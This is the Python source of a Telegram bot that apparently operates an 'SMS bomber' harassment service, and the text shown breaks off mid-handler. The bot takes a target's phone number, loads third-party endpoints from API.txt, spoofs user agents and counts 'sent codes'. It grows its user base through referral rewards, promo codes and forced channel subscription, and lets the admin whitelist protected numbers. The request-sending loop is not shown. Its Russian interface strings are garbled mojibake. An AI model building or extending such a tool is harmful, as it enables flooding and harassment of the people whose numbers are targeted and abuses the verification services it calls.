import requests
from fake_useragent import UserAgent
import time
import telebot
from telebot.handler_backends import State, StatesGroup
from telebot.storage import StateMemoryStorage
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
import logging
import os
import json
import base64
import html

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

bot = telebot.TeleBot('BOT_TOKEN', state_storage=StateMemoryStorage())

ADMIN_ID = ID_ADMINAPON
BOT_USERNAME = 'USERNAME_TVOEGO_BOTA'
CHANNEL_ID = ID_TGK_DLA_BOTA
CHANNEL_LINK = 'LINK_DLA_TGK_BOTA'
PROMO_FILE = 'promocodes.json'
WHITELIST_FILE = 'whitelist.json'
BLACKLIST_FILE = 'blacklist.json'
USERS_FILE = 'users.json'

def init_storage():
    if not os.path.exists(PROMO_FILE):
        with open(PROMO_FILE, 'w') as f:
            json.dump({}, f)
    if not os.path.exists(WHITELIST_FILE):
        with open(WHITELIST_FILE, 'w') as f:
            json.dump([], f)
    if not os.path.exists(BLACKLIST_FILE):
        with open(BLACKLIST_FILE, 'w') as f:
            json.dump([], f)
    if not os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'w') as f:
            json.dump({}, f)

def load_promos():
    try:
        with open(PROMO_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_promos(promos):
    with open(PROMO_FILE, 'w') as f:
        json.dump(promos, f, indent=2)

def load_whitelist():
    try:
        with open(WHITELIST_FILE, 'r') as f:
            return json.load(f)
    except:
        return []

def save_whitelist(whitelist):
    with open(WHITELIST_FILE, 'w') as f:
        json.dump(whitelist, f, indent=2)

def load_blacklist():
    try:
        with open(BLACKLIST_FILE, 'r') as f:
            return json.load(f)
    except:
        return []

def save_blacklist(blacklist):
    with open(BLACKLIST_FILE, 'w') as f:
        json.dump(blacklist, f, indent=2)

def load_users():
    try:
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f, indent=2)

def load_endpoints(file_path='API.txt'):
    try:
        if not os.path.exists(file_path):
            logger.error(f"File {file_path} not found.")
            return None
        with open(file_path, 'r', encoding='utf-8') as file:
            endpoints = [line.strip() for line in file if line.strip()]
        if not endpoints:
            logger.error(f"File {file_path} is empty.")
            return None
        logger.info(f"Loaded {len(endpoints)} endpoints from {file_path}")
        return endpoints
    except Exception as e:
        logger.error(f"Error reading {file_path}: {str(e)}")
        return None

def generate_referral_link(user_id):
    encoded_id = base64.urlsafe_b64encode(str(user_id).encode()).decode().rstrip('=')
    return f"https://t.me/{BOT_USERNAME}?start=ref_{encoded_id}"

def decode_referral_id(encoded_id):
    try:
        decoded_bytes = base64.urlsafe_b64decode(encoded_id + '==')
        return decoded_bytes.decode()
    except Exception as e:
        logger.error(f"Error decoding referral ID {encoded_id}: {str(e)}")
        return None

def check_subscription(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_ID, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        logger.error(f"Error checking subscription for user {user_id}: {str(e)}")
        return False

def is_blacklisted(user_id):
    blacklist = load_blacklist()
    return str(user_id) in blacklist

class BomberStates(StatesGroup):
    PHONE = State()
    CODES = State()
    PROMO_ACTIVATION = State()
    CREATE_PROMO_NAME = State()
    CREATE_PROMO_REWARD = State()
    CREATE_PROMO_ACTIVATIONS = State()
    ADD_WHITELIST = State()
    REMOVE_WHITELIST = State()
    ADD_BLACKLIST = State()
    REMOVE_BLACKLIST = State()

def is_admin(user_id):
    return user_id == ADMIN_ID

def get_progress_bar(current, total):
    bar_length = 10
    filled = int(bar_length * current / total)
    return "‚ñà" * filled + "‚ñí" * (bar_length - filled)

def get_main_menu():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(KeyboardButton("üë§ –ü—Ä–æ—Ñ–∏–ª—å"), KeyboardButton("üí£ –ë–æ–º–±–µ—Ä"))
    markup.add(KeyboardButton("üéÅ –ü—Ä–æ–º–æ–∫–æ–¥"), KeyboardButton("üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞"))
    return markup

def get_admin_menu():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(KeyboardButton("üë§ –ü—Ä–æ—Ñ–∏–ª—å"), KeyboardButton("üí£ –ë–æ–º–±–µ—Ä"))
    markup.add(KeyboardButton("üéÅ –ü—Ä–æ–º–æ–∫–æ–¥"), KeyboardButton("üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞"))
    markup.add(KeyboardButton("üîß –°–æ–∑–¥–∞—Ç—å –ø—Ä–æ–º–æ–∫–æ–¥"), KeyboardButton("üìã –°–ø–∏—Å–æ–∫ –ø—Ä–æ–º–æ–∫–æ–¥–æ–≤"))
    markup.add(KeyboardButton("üõ° –î–æ–±–∞–≤–∏—Ç—å –≤ whitelist"), KeyboardButton("üìú –ü—Ä–æ—Å–º–æ—Ç—Ä whitelist"))
    markup.add(KeyboardButton("üóë –£–¥–∞–ª–∏—Ç—å –∏–∑ whitelist"))
    markup.add(KeyboardButton("üö´ –î–æ–±–∞–≤–∏—Ç—å –≤ blacklist"), KeyboardButton("üìì –ü—Ä–æ—Å–º–æ—Ç—Ä blacklist"))
    markup.add(KeyboardButton("üóë –£–¥–∞–ª–∏—Ç—å –∏–∑ blacklist"))
    return markup

def get_cancel_menu():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    markup.add(KeyboardButton("‚ùå –û—Ç–º–µ–Ω–∞"))
    return markup

def get_subscription_keyboard():
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("üì¢ –ü–æ–¥–ø–∏—Å–∞—Ç—å—Å—è", url=CHANNEL_LINK),
        InlineKeyboardButton("‚úÖ –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –ø–æ–¥–ø–∏—Å–∫—É", callback_data="check_subscription")
    )
    return markup

@bot.callback_query_handler(func=lambda call: call.data == "check_subscription")
def callback_check_subscription(call):
    user_id = call.from_user.id
    if check_subscription(user_id):
        bot.edit_message_text(
            "‚úÖ –í—ã –ø–æ–¥–ø–∏—Å–∞–Ω—ã –Ω–∞ –∫–∞–Ω–∞–ª! –¢–µ–ø–µ—Ä—å –≤—ã –º–æ–∂–µ—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–æ—Ç–∞.",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=None
        )
        markup = get_admin_menu() if is_admin(user_id) else get_main_menu()
        bot.send_message(
            call.message.chat.id,
            "üëá –í—ã–±–µ—Ä–∏, —á—Ç–æ —Ö–æ—á–µ—à—å —Å–¥–µ–ª–∞—Ç—å:",
            reply_markup=markup,
            parse_mode='Markdown'
        )
        bot.answer_callback_query(call.id)
    else:
        bot.answer_callback_query(call.id, "‚ùå –í—ã –Ω–µ –ø–æ–¥–ø–∏—Å–∞–Ω—ã! –ü–æ–¥–ø–∏—à–∏—Ç–µ—Å—å –∏ –ø–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.")

@bot.message_handler(commands=['createpromo'])
def create_promo_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "‚ùå –≠—Ç–∞ –∫–æ–º–∞–Ω–¥–∞ —Ç–æ–ª—å–∫–æ –¥–ª—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞!", reply_markup=get_main_menu())
        return
    bot.reply_to(
        message,
        "üîß –í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –ø—Ä–æ–º–æ–∫–æ–¥–∞:\n"
        "üí° –ü—Ä–∏–º–µ—Ä: WELCOME\n"
        "–î–ª—è –æ—Ç–º–µ–Ω—ã –Ω–∞–∂–º–∏ '‚ùå –û—Ç–º–µ–Ω–∞'",
        reply_markup=get_cancel_menu(),
        parse_mode='Markdown'
    )
    bot.set_state(message.from_user.id, BomberStates.CREATE_PROMO_NAME, message.chat.id)

@bot.message_handler(commands=['listpromos'])
def list_promos(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "‚ùå –≠—Ç–∞ –∫–æ–º–∞–Ω–¥–∞ —Ç–æ–ª—å–∫–æ –¥–ª—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞!", reply_markup=get_main_menu())
        return
    try:
        promos = load_promos()
        if not promos:
            bot.reply_to(message, "‚ÑπÔ∏è –ü—Ä–æ–º–æ–∫–æ–¥–æ–≤ –ø–æ–∫–∞ –Ω–µ—Ç.", reply_markup=get_admin_menu())
            return
        promo_list = "üìã **–°–ø–∏—Å–æ–∫ –ø—Ä–æ–º–æ–∫–æ–¥–æ–≤**:\n\n"
        for name, data in promos.items():
            remaining = data['max_activations'] - data['activations']
            promo_list += (
                f"üîñ `{name}`\n"
                f"üéü –ù–∞–≥—Ä–∞–¥–∞: {data['reward']} –∫–æ–¥–æ–≤\n"
                f"üî¢ –ú–∞–∫—Å. –∞–∫—Ç–∏–≤–∞—Ü–∏–π: {data['max_activations']}\n"
                f"‚è≥ –û—Å—Ç–∞–ª–æ—Å—å: {remaining}\n"
                f"‚úÖ –ê–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–æ: {data['activations']} —Ä–∞–∑\n\n"
            )
        bot.reply_to(message, promo_list, reply_markup=get_admin_menu(), parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"‚ùå –û—à–∏–±–∫–∞: {str(e)}", reply_markup=get_admin_menu())
        logger.error(f"Error listing promos: {str(e)}")

@bot.message_handler(commands=['addtowhitelist'])
def add_to_whitelist_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "‚ùå –≠—Ç–∞ –∫–æ–º–∞–Ω–¥–∞ —Ç–æ–ª—å–∫–æ –¥–ª—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞!", reply_markup=get_main_menu())
        return
    bot.reply_to(
        message,
        "üõ° –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –≤ –±–µ–ª—ã–π —Å–ø–∏—Å–æ–∫:\n"
        "üí° –ü—Ä–∏–º–µ—Ä: +79123456789\n"
        "–î–ª—è –æ—Ç–º–µ–Ω—ã –Ω–∞–∂–º–∏ '‚ùå –û—Ç–º–µ–Ω–∞'",
        reply_markup=get_cancel_menu(),
        parse_mode='Markdown'
    )
    bot.set_state(message.from_user.id, BomberStates.ADD_WHITELIST, message.chat.id)

@bot.message_handler(commands=['listwhitelist'])
def list_whitelist(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "‚ùå –≠—Ç–∞ –∫–æ–º–∞–Ω–¥–∞ —Ç–æ–ª—å–∫–æ –¥–ª—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞!", reply_markup=get_main_menu())
        return
    try:
        whitelist = load_whitelist()
        if not whitelist:
            bot.reply_to(message, "‚ÑπÔ∏è –ë–µ–ª—ã–π —Å–ø–∏—Å–æ–∫ –ø—É—Å—Ç.", reply_markup=get_admin_menu())
            return
        whitelist_text = "üìú **–ë–µ–ª—ã–π —Å–ø–∏—Å–æ–∫**:\n\n"
        for number in whitelist:
            whitelist_text += f"üìû `{number}`\n"
        bot.reply_to(message, whitelist_text, reply_markup=get_admin_menu(), parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"‚ùå –û—à–∏–±–∫–∞: {str(e)}", reply_markup=get_admin_menu())
        logger.error(f"Error listing whitelist: {str(e)}")

@bot.message_handler(commands=['removefromwhitelist'])
def remove_from_whitelist_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "‚ùå –≠—Ç–∞ –∫–æ–º–∞–Ω–¥–∞ —Ç–æ–ª—å–∫–æ –¥–ª—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞!", reply_markup=get_main_menu())
        return
    bot.reply_to(
        message,
        "üóë –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è –∏–∑ –±–µ–ª–æ–≥–æ —Å–ø–∏—Å–∫–∞:\n"
        "üí° –ü—Ä–∏–º–µ—Ä: +79123456789\n"
        "–î–ª—è –æ—Ç–º–µ–Ω—ã –Ω–∞–∂–º–∏ '‚ùå –û—Ç–º–µ–Ω–∞'",
        reply_markup=get_cancel_menu(),
        parse_mode='Markdown'
    )
    bot.set_state(message.from_user.id, BomberStates.REMOVE_WHITELIST, message.chat.id)

@bot.message_handler(commands=['addtoblacklist'])
def add_to_blacklist_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "‚ùå –≠—Ç–∞ –∫–æ–º–∞–Ω–¥–∞ —Ç–æ–ª—å–∫–æ –¥–ª—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞!", reply_markup=get_main_menu())
        return
    bot.reply_to(
        message,
        "üö´ –í–≤–µ–¥–∏—Ç–µ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –≤ —á–µ—Ä–Ω—ã–π —Å–ø–∏—Å–æ–∫:\n"
        "üí° –ü—Ä–∏–º–µ—Ä: 6457569474\n"
        "–î–ª—è –æ—Ç–º–µ–Ω—ã –Ω–∞–∂–º–∏ '‚ùå –û—Ç–º–µ–Ω–∞'",
        reply_markup=get_cancel_menu(),
        parse_mode='Markdown'
    )
    bot.set_state(message.from_user.id, BomberStates.ADD_BLACKLIST, message.chat.id)

@bot.message_handler(commands=['listblacklist'])
def list_blacklist(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "‚ùå –≠—Ç–∞ –∫–æ–º–∞–Ω–¥–∞ —Ç–æ–ª—å–∫–æ –¥–ª—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞!", reply_markup=get_main_menu())
        return
    try:
        blacklist = load_blacklist()
        if not blacklist:
            bot.reply_to(message, "‚ÑπÔ∏è –ß–µ—Ä–Ω—ã–π —Å–ø–∏—Å–æ–∫ –ø—É—Å—Ç.", reply_markup=get_admin_menu())
            return
        blacklist_text = "üìì **–ß–µ—Ä–Ω—ã–π —Å–ø–∏—Å–æ–∫**:\n\n"
        for user_id in blacklist:
            blacklist_text += f"üÜî `{user_id}`\n"
        bot.reply_to(message, blacklist_text, reply_markup=get_admin_menu(), parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"‚ùå –û—à–∏–±–∫–∞: {str(e)}", reply_markup=get_admin_menu())
        logger.error(f"Error listing blacklist: {str(e)}")

@bot.message_handler(commands=['removefromblacklist'])
def remove_from_blacklist_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "‚ùå –≠—Ç–∞ –∫–æ–º–∞–Ω–¥–∞ —Ç–æ–ª—å–∫–æ –¥–ª—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞!", reply_markup=get_main_menu())
        return
    bot.reply_to(
        message,
        "üóë –í–≤–µ–¥–∏—Ç–µ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è –∏–∑ —á–µ—Ä–Ω–æ–≥–æ —Å–ø–∏—Å–∫–∞:\n"
        "üí° –ü—Ä–∏–º–µ—Ä: 6457569474\n"
        "–î–ª—è –æ—Ç–º–µ–Ω—ã –Ω–∞–∂–º–∏ '‚ùå –û—Ç–º–µ–Ω–∞'",
        reply_markup=get_cancel_menu(),
        parse_mode='Markdown'
    )
    bot.set_state(message.from_user.id, BomberStates.REMOVE_BLACKLIST, message.chat.id)

@bot.message_handler(commands=['start'])
def start(message):
    logger.info(f"Received /start from user {message.from_user.id} in chat {message.chat.id}")
    user_id = str(message.from_user.id)
    if is_blacklisted(user_id):
        bot.reply_to(message, "üö´ –í—ã –Ω–∞—Ö–æ–¥–∏—Ç–µ—Å—å –≤ —á–µ—Ä–Ω–æ–º —Å–ø–∏—Å–∫–µ –∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–æ—Ç–∞!", parse_mode='Markdown')
        return
    if not check_subscription(user_id):
        bot.reply_to(
            message,
            "üì¢ –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥–ø–∏—à–∏—Ç–µ—Å—å –Ω–∞ –Ω–∞—à –∫–∞–Ω–∞–ª, —á—Ç–æ–±—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–æ—Ç–∞!\n"
            "–ü–æ—Å–ª–µ –ø–æ–¥–ø–∏—Å–∫–∏ –Ω–∞–∂–º–∏—Ç–µ '–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –ø–æ–¥–ø–∏—Å–∫—É'.",
            reply_markup=get_subscription_keyboard(),
            parse_mode='Markdown'
        )
        return
    users = load_users()
    args = message.text.split()
    referrer_id = None
    if len(args) > 1 and args[1].startswith('ref_'):
        encoded_ref = args[1][4:]
        referrer_id = decode_referral_id(encoded_ref)
        if referrer_id and referrer_id in users and referrer_id != user_id:
            if 'referrals' not in users[referrer_id]:
                users[referrer_id]['referrals'] = []
            if user_id not in users[referrer_id]['referrals']:
                users[referrer_id]['referrals'].append(user_id)
                users[referrer_id]['codes'] += 2
                save_users(users)
                bot.send_message(
                    referrer_id,
                    f"üéâ –ù–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–æ –≤–∞—à–µ–π —Å—Å—ã–ª–∫–µ!\n"
                    f"–í–∞–º –Ω–∞—á–∏—Å–ª–µ–Ω–æ **2 –∫–æ–¥–∞**! üöÄ",
                    parse_mode='Markdown'
                )
                logger.info(f"User {user_id} registered via referral from {referrer_id}, awarded 2 codes")
    if user_id not in users:
        users[user_id] = {
            'codes': 0,
            'sent_codes': 0,
            'activated_promos': 0,
            'name': message.from_user.first_name,
            'username': message.from_user.username or 'None',
            'referrals': [],
            'referrer_id': referrer_id if referrer_id else None
        }
        save_users(users)
    referral_link = generate_referral_link(user_id)
    welcome_text = (
        f"üëã –ü—Ä–∏–≤–µ—Ç, {message.from_user.first_name}!\n"
        f"–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ **{BOT_USERNAME}**! üéâ\n\n"
        f"–Ø –ø–æ–º–æ–≥—É —Ç–µ–±–µ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å –∫–æ–¥—ã –∏ –∑–∞—Ä–∞–±–∞—Ç—ã–≤–∞—Ç—å –±–æ–Ω—É—Å—ã! üòé\n"
        f"üîó –¢–≤–æ—è —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å—Å—ã–ª–∫–∞:\n`{referral_link}`\n"
        f"ü´Ç –ü—Ä–∏–≥–ª–∞—à–∞–π –¥—Ä—É–∑–µ–π –∏ –ø–æ–ª—É—á–∞–π **2 –∫–æ–¥–∞** –∑–∞ –∫–∞–∂–¥–æ–≥–æ!\n\n"
        f"üëá –í—ã–±–µ—Ä–∏, —á—Ç–æ —Ö–æ—á–µ—à—å —Å–¥–µ–ª–∞—Ç—å:"
    )
    markup = get_admin_menu() if is_admin(message.from_user.id) else get_main_menu()
    bot.reply_to(message, welcome_text, reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(content_types=['text'])
def handle_text(message):
    user_id = str(message.from_user.id)
    if is_blacklisted(user_id):
        bot.reply_to(message, "üö´ –í—ã –Ω–∞—Ö–æ–¥–∏—Ç–µ—Å—å –≤ —á–µ—Ä–Ω–æ–º —Å–ø–∏—Å–∫–µ –∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–æ—Ç–∞!", parse_mode='Markdown')
        return
    if not check_subscription(user_id):
        bot.reply_to(
            message,
            "üì¢ –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥–ø–∏—à–∏—Ç–µ—Å—å –Ω–∞ –Ω–∞—à –∫–∞–Ω–∞–ª, —á—Ç–æ–±—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–æ—Ç–∞!\n"
            "–ü–æ—Å–ª–µ –ø–æ–¥–ø–∏—Å–∫–∏ –Ω–∞–∂–º–∏—Ç–µ '–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –ø–æ–¥–ø–∏—Å–∫—É'.",
            reply_markup=get_subscription_keyboard(),
            parse_mode='Markdown'
        )
        return
    users = load_users()
    markup = get_admin_menu() if is_admin(message.from_user.id) else get_main_menu()
    if message.text == "üë§ –ü—Ä–æ—Ñ–∏–ª—å":
        if user_id in users:
            user = users[user_id]
            referral_count = len(user.get('referrals', []))
            referral_link = generate_referral_link(user_id)
            profile_text = (
                f"üë§ **–í–∞—à –ø—Ä–æ—Ñ–∏–ª—å**\n\n"
                f"üìõ –ò–º—è: {user['name']}\n"
                f"üì± –Æ–∑–µ—Ä–Ω–µ–π–º: @{user['username']}\n"
                f"üÜî ID: {user_id}\n"
                f"üéü **–ë–∞–ª–∞–Ω—Å –∫–æ–¥–æ–≤**: {user['codes']}\n"
                f"üì§ **–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –∫–æ–¥–æ–≤**: {user['sent_codes']}\n"
                f"üéÅ **–ê–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–æ –ø—Ä–æ–º–æ–∫–æ–¥–æ–≤**: {user['activated_promos']}\n\n"
                f"üîó **–†–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å—Å—ã–ª–∫–∞**:\n`{referral_link}`\n"
                f"ü´Ç **–ü—Ä–∏–≥–ª–∞—à–µ–Ω–æ –¥—Ä—É–∑–µ–π**: {referral_count}\n\n"
                f"üí° –ü—Ä–∏–≥–ª–∞—à–∞–π—Ç–µ –¥—Ä—É–∑–µ–π, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –±–æ–ª—å—à–µ –∫–æ–¥–æ–≤!"
            )
            bot.reply_to(message, profile_text, reply_markup=markup, parse_mode='Markdown')
        else:
            bot.reply_to(message, "‚ùå –ü—Ä–æ—Ñ–∏–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω! –ü–æ–ø—Ä–æ–±—É–π —Å–Ω–æ–≤–∞.", reply_markup=markup)
    elif message.text == "üí£ –ë–æ–º–±–µ—Ä":
        if user_id in users and users[user_id]['codes'] > 0:
            bot.reply_to(
                message,
                "üìû –í–≤–µ–¥–∏ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –≤ —Ñ–æ—Ä–º–∞—Ç–µ: **+79123456789**\n"
                "üí° –£–±–µ–¥–∏—Å—å, —á—Ç–æ –Ω–æ–º–µ—Ä –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å '+' –∏ —Å–æ–¥–µ—Ä–∂–∏—Ç —Ç–æ–ª—å–∫–æ —Ü–∏—Ñ—Ä—ã.\n"
                "–î–ª—è –æ—Ç–º–µ–Ω—ã –Ω–∞–∂–º–∏ '‚ùå –û—Ç–º–µ–Ω–∞'",
                reply_markup=get_cancel_menu(),
                parse_mode='Markdown'
            )
            bot.set_state(message.from_user.id, BomberStates.PHONE, message.chat.id)
        else:
            bot.reply_to(
                message,
                "‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –∫–æ–¥–æ–≤!\n"
                f"–£ —Ç–µ–±—è: **{users.get(user_id, {}).get('codes', 0)} –∫–æ–¥–æ–≤**.\n"
                "üéÅ –ê–∫—Ç–∏–≤–∏—Ä—É–π –ø—Ä–æ–º–æ–∫–æ–¥ –∏–ª–∏ –ø—Ä–∏–≥–ª–∞—à–∞–π –¥—Ä—É–∑–µ–π –ø–æ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–æ–π —Å—Å—ã–ª–∫–µ!",
                reply_markup=markup,
                parse_mode='Markdown'
            )
    elif message.text == "üéÅ –ü—Ä–æ–º–æ–∫–æ–¥":
        bot.reply_to(
            message,
            "üîë –í–≤–µ–¥–∏ –Ω–∞–∑–≤–∞–Ω–∏–µ –ø—Ä–æ–º–æ–∫–æ–¥–∞:\n"
            "üí° –ü—Ä–∏–º–µ—Ä: WELCOME\n"
            "–î–ª—è –æ—Ç–º–µ–Ω—ã –Ω–∞–∂–º–∏ '‚ùå –û—Ç–º–µ–Ω–∞'",
            reply_markup=get_cancel_menu(),
            parse_mode='Markdown'
        )
        bot.set_state(message.from_user.id, BomberStates.PROMO_ACTIVATION, message.chat.id)
    elif message.text == "üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞":
        users = load_users()
        promos = load_promos()
        total_users = len(users)
        total_codes_sent = sum(user['sent_codes'] for user in users.values())
        total_promo_activations = sum(promo['activations'] for promo in promos.values())
        total_referrals = sum(len(user.get('referrals', [])) for user in users.values())
        stats_text = (
            f"üìä **–û–±—â–∞—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –±–æ—Ç–∞**\n\n"
            f"üë• –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: **{total_users}**\n"
            f"üì§ –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –∫–æ–¥–æ–≤: **{total_codes_sent}**\n"
            f"üéÅ –ê–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–æ –ø—Ä–æ–º–æ–∫–æ–¥–æ–≤: **{total_promo_activations}**\n"
            f"ü´Ç –ü—Ä–∏–≥–ª–∞—à–µ–Ω–æ –¥—Ä—É–∑–µ–π: **{total_referrals}**\n\n"
            f"üí° –•–æ—á–µ—à—å –±–æ–ª—å—à–µ –∫–æ–¥–æ–≤? –ü—Ä–∏–≥–ª–∞—à–∞–π –¥—Ä—É–∑–µ–π!"
        )
        bot.reply_to(message, stats_text, reply_markup=markup, parse_mode='Markdown')
    elif message.text == "üîß –°–æ–∑–¥–∞—Ç—å –ø—Ä–æ–º–æ–∫–æ–¥" and is_admin(message.from_user.id):
        bot.reply_to(
            message,
            "üîß –í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –ø—Ä–æ–º–æ–∫–æ–¥–∞:\n"
            "üí° –ü—Ä–∏–º–µ—Ä: WELCOME\n"
            "–î–ª—è –æ—Ç–º–µ–Ω—ã –Ω–∞–∂–º–∏ '‚ùå –û—Ç–º–µ–Ω–∞'",
            reply_markup=get_cancel_menu(),
            parse_mode='Markdown'
        )
        bot.set_state(message.from_user.id, BomberStates.CREATE_PROMO_NAME, message.chat.id)
    elif message.text == "üìã –°–ø–∏—Å–æ–∫ –ø—Ä–æ–º–æ–∫–æ–¥–æ–≤" and is_admin(message.from_user.id):
        list_promos(message)
    elif message.text == "üõ° –î–æ–±–∞–≤–∏—Ç—å –≤ whitelist" and is_admin(message.from_user.id):
        bot.reply_to(
            message,
            "üõ° –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –≤ –±–µ–ª—ã–π —Å–ø–∏—Å–æ–∫:\n"
            "üí° –ü—Ä–∏–º–µ—Ä: +79123456789\n"
            "–î–ª—è –æ—Ç–º–µ–Ω—ã –Ω–∞–∂–º–∏ '‚ùå –û—Ç–º–µ–Ω–∞'",
            reply_markup=get_cancel_menu(),
            parse_mode='Markdown'
        )
        bot.set_state(message.from_user.id, BomberStates.ADD_WHITELIST, message.chat.id)
    elif message.text == "üìú –ü—Ä–æ—Å–º–æ—Ç—Ä whitelist" and is_admin(message.from_user.id):
        list_whitelist(message)
    elif message.text == "üóë –£–¥–∞–ª–∏—Ç—å –∏–∑ whitelist" and is_admin(message.from_user.id):
        bot.reply_to(
            message,
            "üóë –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è –∏–∑ –±–µ–ª–æ–≥–æ —Å–ø–∏—Å–∫–∞:\n"
            "üí° –ü—Ä–∏–º–µ—Ä: +79123456789\n"
            "–î–ª—è –æ—Ç–º–µ–Ω—ã –Ω–∞–∂–º–∏ '‚ùå –û—Ç–º–µ–Ω–∞'",
            reply_markup=get_cancel_menu(),
            parse_mode='Markdown'
        )
        bot.set_state(message.from_user.id, BomberStates.REMOVE_WHITELIST, message.chat.id)
    elif message.text == "üö´ –î–æ–±–∞–≤–∏—Ç—å –≤ blacklist" and is_admin(message.from_user.id):
        bot.reply_to(
            message,
            "üö´ –í–≤–µ–¥–∏—Ç–µ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –≤ —á–µ—Ä–Ω—ã–π —Å–ø–∏—Å–æ–∫:\n"
            "üí° –ü—Ä–∏–º–µ—Ä: 6457569474\n"
            "–î–ª—è –æ—Ç–º–µ–Ω—ã –Ω–∞–∂–º–∏ '‚ùå –û—Ç–º–µ–Ω–∞'",
            reply_markup=get_cancel_menu(),
            parse_mode='Markdown'
        )
